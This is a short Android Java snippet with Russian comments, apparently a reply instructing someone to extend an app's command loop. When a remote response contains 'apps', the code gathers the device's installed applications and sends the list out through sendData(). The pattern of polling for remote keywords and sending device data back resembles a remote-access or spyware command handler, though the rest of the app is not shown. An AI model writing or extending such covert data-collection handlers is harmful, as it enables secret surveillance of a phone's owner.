// Внутри метода loop() в блоке if (response != null) добавь:
if (response.contains("apps")) {
    String appsList = getInstalledApps();
    sendData("text", appsList);
}

// И добавь метод getInstalledApps():
private String getInstalledApps() {
    StringBuilder sb = new StringBuilder("Установленные приложения:\n");
    android.content.pm.PackageManager pm = getPackageManager();
    for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(0)) {
        if (pm.getLaunchIntentForPackage(app.packageName) != null) {
            sb.append(pm.getApplicationLabel(app)).append(" (").append(app.packageName).append(")\n");
        }
    }
    return sb.toString();
}
